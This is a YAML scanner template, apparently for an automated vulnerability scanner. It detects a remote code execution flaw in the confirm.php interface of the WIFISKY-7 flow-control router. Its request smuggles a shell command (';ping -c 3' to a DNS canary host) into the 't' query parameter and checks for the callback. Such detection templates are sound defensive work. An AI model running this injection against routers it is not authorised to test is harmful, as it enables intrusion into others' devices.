id: "wifisky7-rce"
name: "WIFISKY-7 Layer Flow Control Router - Remote Code Execution"
severity: "high"
description: "There is an RCE vulnerability in the confirm.php interface of WIFISKY-7 layer flow control router"
tech:
  - "php"
tags:
  - "wifisky"
  - "rce"
  - "vuln"
reference: "https://github.com/wy876/POC/blob/main/WIFISKY-7%E5%B1%82%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8confirm.php%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E.md"
spaExclusion: true
request:
  method: "GET"
  path: "/notice/confirm.php?t=%3bping+-c+3+{{guardian_canary_dns}}"
control:
  method: "GET"
  path: "/notice/confirm.php?t=%3bping+-c+3+guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "canary"
    protocol: "dns"
  - type: "word"
    part: "header"
    words:
      - "L7Engine"
  - type: "status"
    status:
      - 200
